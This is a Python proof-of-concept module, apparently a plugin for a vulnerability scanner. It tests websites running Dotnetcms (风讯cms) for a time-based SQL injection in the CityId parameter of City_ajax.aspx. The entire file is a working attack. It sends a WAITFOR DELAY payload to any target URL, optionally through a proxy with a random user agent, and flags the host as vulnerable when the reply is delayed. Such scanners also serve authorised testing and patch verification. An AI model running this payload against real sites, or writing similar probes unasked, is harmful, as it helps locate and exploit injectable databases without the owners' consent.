#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: Dotnetcms(风讯cms)SQL注入漏洞
referer: https://silic.wiki/0day:%E9%A3%8E%E8%BF%85_dotnetcms_2.0-1.0_sql_injection
author: Lucifer
description: 文件City_ajax.aspx中,参数CityId存在SQL注入。
'''
import urllib
import requests

import time
def UrlProcessing(url):
    if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload = "/user/City_ajax.aspx?CityId=1%27WAiTFoR%20DeLAy%20%270:0:6%27--"


def medusa(Url, RandomAgent, ProxyIp):
    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    payload_url = scheme + "://" + url + payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        # s = requests.session()
        start_time = time.time()
        if ProxyIp != None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp == None:
            resp = requests.get(payload_url,  headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if time.time() - start_time >= 6:
            Medusa = "{} 存在Dotnetcms(风讯cms)SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass